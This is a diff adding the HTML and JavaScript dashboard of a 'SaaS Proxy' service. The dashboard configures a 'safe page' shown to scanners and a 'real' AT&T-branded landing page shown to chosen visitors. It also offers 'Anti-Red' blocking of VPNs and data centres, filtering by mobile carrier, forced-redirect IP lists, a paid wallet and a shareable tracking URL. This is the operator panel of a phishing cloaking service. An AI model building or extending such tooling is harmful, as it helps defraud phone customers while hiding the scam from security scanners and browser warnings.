@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Dashboard - SaaS Proxy</title>
+    <style>
+        body { font-family: sans-serif; margin: 0; background: #f0f2f5; display: flex; }
+        .sidebar { width: 250px; background: #343a40; color: white; height: 100vh; padding: 20px; }
+        .main { flex: 1; padding: 40px; }
+        .card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); margin-bottom: 20px; }
+        h1, h2 { color: #333; }
+        .sidebar h2 { color: white; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; font-weight: bold; }
+        input[type="text"], input[type="email"], select { width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+        .toggle-group { display: flex; align-items: center; gap: 10px; margin-bottom: 15px; }
+        button { padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
+        button:hover { background: #0056b3; }
+        .logout { margin-top: auto; color: #ff4d4d; cursor: pointer; }
+        .wallet-info { font-size: 1.2em; color: #28a745; font-weight: bold; }
+        
+        /* Simple Toggle Switch CSS */
+        .switch { position: relative; display: inline-block; width: 50px; height: 24px; }
+        .switch input { opacity: 0; width: 0; height: 0; }
+        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .4s; border-radius: 24px; }
+        .slider:before { position: absolute; content: ""; height: 16px; width: 16px; left: 4px; bottom: 4px; background-color: white; transition: .4s; border-radius: 50%; }
+        input:checked + .slider { background-color: #28a745; }
+        input:checked + .slider:before { transform: translateX(26px); }
+    </style>
+</head>
+<body>
+    <div class="sidebar">
+        <h2>SaaS Proxy</h2>
+        <p id="userName">Loading...</p>
+        <div class="wallet-info">Wallet: $<span id="walletBalance">0.00</span></div>
+        <button onclick="topUp()" style="background: #28a745; margin-top: 10px;">Top Up</button>
+        <hr>
+        <div class="logout" onclick="logout()">Logout</div>
+    </div>
+    <div class="main">
+        <h1>Dashboard</h1>
+        
+        <div class="card">
+            <h2>Landing Page Links</h2>
+            <div class="form-group">
+                <label>Non-Real Landing Page (Safe Page)</label>
+                <input type="text" id="nonRealLink" placeholder="https://safe-site.com">
+            </div>
+            <div class="form-group">
+                <label>Real Landing Page (AT&T Page)</label>
+                <input type="text" id="realLink" placeholder="https://att-promo.com">
+            </div>
+            <button onclick="saveSettings()">Save Links</button>
+        </div>
+
+        <div class="card">
+            <h2>Security Settings</h2>
+            <div class="toggle-group">
+                <label class="switch">
+                    <input type="checkbox" id="antiRed">
+                    <span class="slider"></span>
+                </label>
+                <span>Anti-Red (Blocks Proxy/VPN and Data Centers)</span>
+            </div>
+            <div class="toggle-group">
+                <label class="switch">
+                    <input type="checkbox" id="ispFilter">
+                    <span class="slider"></span>
+                </label>
+                <span>Mobile ISP Filter (Only allow specific carriers)</span>
+            </div>
+            <div id="ispConfig" style="margin-left: 60px; margin-bottom: 15px;">
+                <label>Allowed ISPs (comma separated)</label>
+                <input type="text" id="mobileIsps" placeholder="ATT, VERIZON, T-MOBILE">
+            </div>
+            <div class="toggle-group">
+                <label class="switch">
+                    <input type="checkbox" id="reallowVisited">
+                    <span class="slider"></span>
+                </label>
+                <span>Reallow visited IP</span>
+            </div>
+            <button onclick="saveSettings()">Save Settings</button>
+        </div>
+
+        <div class="card">
+            <h2>Forced Redirect IPs</h2>
+            <p>These IPs will always be redirected to the Real Landing Page.</p>
+            <div class="form-group" style="display: flex; gap: 10px;">
+                <input type="text" id="newForcedIp" placeholder="123.123.123.123">
+                <button onclick="addForcedIp()">Add IP</button>
+            </div>
+            <ul id="forcedIpList"></ul>
+        </div>
+
+        <div class="card">
+            <h2>Your Tracking URL</h2>
+            <p>Share this link to start tracking:</p>
+            <code id="trackingUrl">Loading...</code>
+        </div>
+    </div>
+
+    <script>
+        async function loadData() {
+            const res = await fetch('/api/user');
+            if (res.status === 401) window.location.href = '/login.html';
+            const user = await res.json();
+            
+            document.getElementById('userName').innerText = user.name;
+            document.getElementById('walletBalance').innerText = user.wallet.toFixed(2);
+            document.getElementById('nonRealLink').value = user.settings.nonRealLink;
+            document.getElementById('realLink').value = user.settings.realLink;
+            document.getElementById('antiRed').checked = user.settings.antiRed;
+            document.getElementById('ispFilter').checked = user.settings.ispFilter;
+            document.getElementById('mobileIsps').value = user.settings.mobileIsps.join(', ');
+            document.getElementById('reallowVisited').checked = user.settings.reallowVisited;
+            document.getElementById('trackingUrl').innerText = window.location.origin + '/u/' + user.id;
+            
+            const forcedIpList = document.getElementById('forcedIpList');
+            forcedIpList.innerHTML = '';
+            user.forcedIps.forEach(ip => {
+                const li = document.createElement('li');
+                li.innerHTML = `${ip} <span style="color:red; cursor:pointer;" onclick="removeForcedIp('${ip}')">[Remove]</span>`;
+                forcedIpList.appendChild(li);
+            });
+        }
+
+        async function addForcedIp() {
+            const ip = document.getElementById('newForcedIp').value;
+            if (!ip) return;
+            const res = await fetch('/api/forced-ips', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ ip })
+            });
+            if (res.ok) {
+                document.getElementById('newForcedIp').value = '';
+                loadData();
+            }
+        }
+
+        async function removeForcedIp(ip) {
+            const res = await fetch('/api/forced-ips/' + ip, { method: 'DELETE' });
+            if (res.ok) loadData();
+        }
+
+        async function saveSettings() {
+            const settings = {
+                nonRealLink: document.getElementById('nonRealLink').value,
+                realLink: document.getElementById('realLink').value,
+                antiRed: document.getElementById('antiRed').checked,
+                ispFilter: document.getElementById('ispFilter').checked,
+                mobileIsps: document.getElementById('mobileIsps').value.split(',').map(s => s.trim()).filter(s => s),
+                reallowVisited: document.getElementById('reallowVisited').checked
+            };
+
+            const res = await fetch('/api/settings', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(settings)
+            });
+
+            if (res.ok) alert('Settings saved!');
+            else alert('Error saving settings');
+        }
+
+        async function topUp() {
+            const amount = prompt("Enter amount to top up (simulated):", "50.00");
+            if (amount) {
+                const res = await fetch('/api/topup', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ amount: parseFloat(amount) })
+                });
+                if (res.ok) {
+                    alert('Top up successful!');
+                    loadData();
+                }
+            }
+        }
+
+        async function logout() {
+            await fetch('/api/logout', { method: 'POST' });
+            window.location.href = '/login.html';
+        }
+
+        loadData();
+    </script>
+</body>
+</html>
